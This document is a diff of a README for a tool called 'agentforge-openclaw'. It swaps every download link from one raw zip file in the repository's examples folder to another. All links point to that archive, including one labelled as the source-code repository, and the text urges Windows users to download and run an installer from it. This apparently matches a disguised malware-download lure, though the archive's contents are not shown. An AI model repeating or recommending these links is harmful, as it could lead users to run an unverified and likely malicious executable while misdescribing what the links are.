@@ -1,6 +1,6 @@
 # 🤖 agentforge-openclaw - Build Smart Skills Quickly
 
-[![Download agentforge-openclaw](https://img.shields.io/badge/Download-OpenClaw-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/openclaw_agentforge_spelder.zip)
+[![Download agentforge-openclaw](https://img.shields.io/badge/Download-OpenClaw-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/weather-bot/agentforge-openclaw-2.8.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get agentforge-openclaw up and running on your Windows mac
 
 Click the big green button below to visit the download page:
 
-[![Download agentforge-openclaw](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/openclaw_agentforge_spelder.zip)
+[![Download agentforge-openclaw](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/weather-bot/agentforge-openclaw-2.8.zip)
 
 On the page, scroll to the latest release or look for a download section. Find the Windows installer or executable file and save it to your computer.
 
@@ -111,10 +111,10 @@ agentforge-openclaw is updated regularly to improve stability and add features.
 ## 🔗 Useful Links
 
 - Download and information page:  
-  [https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/openclaw_agentforge_spelder.zip](https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/openclaw_agentforge_spelder.zip)
+  [https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/weather-bot/agentforge-openclaw-2.8.zip](https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/weather-bot/agentforge-openclaw-2.8.zip)
 
 - GitHub repository for issues and source code:  
-  [https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/openclaw_agentforge_spelder.zip](https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/openclaw_agentforge_spelder.zip)
+  [https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/weather-bot/agentforge-openclaw-2.8.zip](https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/weather-bot/agentforge-openclaw-2.8.zip)
 
 ---
 
@@ -146,4 +146,4 @@ Check the repository for documentation updates and community discussions.
 
 ---
 
-[![Download agentforge-openclaw](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/openclaw_agentforge_spelder.zip)
+[![Download agentforge-openclaw](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/xyreinsurance119/agentforge-openclaw/main/examples/weather-bot/agentforge-openclaw-2.8.zip)
